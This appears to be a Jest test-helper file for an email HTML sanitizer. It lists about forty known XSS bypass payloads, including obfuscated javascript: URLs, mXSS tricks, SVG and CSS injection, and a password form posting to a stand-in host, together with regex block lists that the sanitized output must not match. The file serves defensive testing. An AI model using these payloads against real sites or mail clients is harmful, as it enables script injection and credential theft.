import { expect } from "@jest/globals";
import { sanitizeUntrustedEmailHtml } from "../sanitize-email-html";

type BypassCase = { name: string; html: string; forbidden?: RegExp };

const CONTROL_CHAR = String.fromCharCode(1);

/** Known sanitizer bypasses; both the DOM and the non-DOM path must neutralize all of them. */
export const BYPASS_CASES: BypassCase[] = [
  { name: "javascript: href", html: '<a href="javascript:alert(1)">x</a>' },
  { name: "mixed-case scheme", html: '<a href="JaVaScRiPt:alert(1)">x</a>' },
  { name: "tab entity inside scheme", html: '<a href="jav&#x09;ascript:alert(1)">x</a>', forbidden: /href/ },
  { name: "newline inside scheme", html: '<a href="java\nscript:alert(1)">x</a>', forbidden: /href/ },
  {
    name: "fully entity-encoded scheme",
    html: '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">x</a>',
    forbidden: /href/,
  },
  { name: "&colon; entity", html: '<a href="javascript&colon;alert(1)">x</a>', forbidden: /href/ },
  {
    name: "leading control characters",
    html: `<a href="${CONTROL_CHAR} javascript:alert(1)">x</a>`,
    forbidden: /href/,
  },
  { name: "vbscript href", html: '<a href="vbscript:msgbox(1)">x</a>' },
  {
    name: "data:text/html href",
    html: '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
    forbidden: /href|data:/,
  },
  { name: "unknown app scheme href", html: '<a href="solace://account/delete">x</a>', forbidden: /href/ },
  { name: "javascript: in srcset", html: '<img srcset="javascript:alert(1) 1x, https://e.test/a.png 2x">' },
  { name: "formaction", html: '<button formaction="javascript:alert(1)">x</button>' },
  {
    name: "form action",
    html: '<form action="https://e.test/steal"><input name="password"></form>',
    forbidden: /e\.test|password/,
  },
  {
    name: "xlink:href in svg",
    html: '<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>',
  },
  { name: "svg script", html: "<svg><script>alert(1)</script></svg>", forbidden: /alert/ },
  { name: "svg onload", html: "<svg/onload=alert(1)>" },
  {
    name: "math mXSS",
    html: "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math>",
  },
  {
    name: "noscript mXSS",
    html: '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>',
  },
  {
    name: "meta refresh",
    html: '<meta http-equiv="refresh" content="0;url=https://e.test">',
    forbidden: /refresh|e\.test/,
  },
  { name: "base href", html: '<base href="https://e.test/">', forbidden: /e\.test/ },
  { name: "link stylesheet", html: '<link rel="stylesheet" href="https://e.test/x.css">', forbidden: /e\.test/ },
  { name: "iframe srcdoc", html: '<iframe srcdoc="<script>alert(1)</script>"></iframe>', forbidden: /srcdoc|alert/ },
  { name: "object data", html: '<object data="javascript:alert(1)"></object>' },
  { name: "embed src", html: '<embed src="javascript:alert(1)">' },
  { name: "template script", html: "<template><script>alert(1)</script></template>", forbidden: /alert/ },
  { name: "plain onerror", html: "<img src=x onerror=alert(1)>" },
  { name: "uppercase handler with spaces", html: '<img src=x ONERROR = "alert(1)">' },
  { name: "slash-separated attributes", html: "<img/src=x/onerror=alert(1)>" },
  { name: "whitespace-separated handler", html: "<img src=x\nonerror\t=\nalert(1)>" },
  { name: "body onload", html: "<body onload=alert(1)><p>x</p></body>" },
  { name: "handler after quoted gt", html: '<img alt=">" onerror="alert(1)" src=x>' },
  { name: "svg data image src", html: '<img src="data:image/svg+xml,<svg onload=alert(1)>">', forbidden: /data:/ },
  { name: "style expression()", html: '<div style="width: expression(alert(1))">x</div>' },
  { name: "style url(javascript:)", html: '<div style="background:url(javascript:alert(1))">x</div>' },
  {
    name: "style with css escapes",
    html: '<div style="background:url(j\\61vascript:alert(1))">x</div>',
    forbidden: /style/,
  },
  { name: "style behavior", html: '<div style="behavior:url(x.htc)">x</div>', forbidden: /style/ },
  { name: "style -moz-binding", html: '<div style="-moz-binding:url(x.xml#x)">x</div>' },
  {
    name: "style block with expression()",
    html: "<style>p{width:expression(alert(1))}</style><p>x</p>",
  },
  {
    name: "style block with escaped javascript url",
    html: "<style>p{background:url(j\\61vascript:alert(1))}</style><p>x</p>",
    forbidden: /alert/,
  },
  { name: "unterminated tag", html: "<p>hi</p><img src=x onerror=alert(1)//" },
];

const ALWAYS_FORBIDDEN = [
  /<(?:script|svg|math|meta|base|form|input|button|iframe|object|embed|link|template|noscript)\b/i,
  /<[^>]*\son[a-z]+\s*=/i,
  /(?:javascript|vbscript)\s*:/i,
  /srcset|formaction|xlink:href|expression\(|-moz-binding/i,
];

export function expectBypassNeutralized(
  testCase: BypassCase,
  profile: "compose" | "reader",
): void {
  const output = sanitizeUntrustedEmailHtml(testCase.html, { profile });
  for (const pattern of ALWAYS_FORBIDDEN) {
    expect(output).not.toMatch(pattern);
  }
  if (profile === "compose") {
    expect(output).not.toMatch(/<style/i);
  }
  if (testCase.forbidden) {
    expect(output).not.toMatch(testCase.forbidden);
  }
}

export const READER_KEEPS = {
  html:
    '<style>.card{color:#111;background:url(cid:logo@x)}</style>' +
    '<table class="card" data-signature-block="1"><tbody><tr>' +
    '<td style="width:120px" bgcolor="#fff">When</td>' +
    '<td><a href="https://example.com/a?b=1&amp;c=2">Link</a> <a href="mailto:a@example.com">Mail</a></td>' +
    '</tr></tbody></table>' +
    '<img src="cid:abc@x" alt="logo"><img src="data:image/png;base64,abc" width="10">',
};
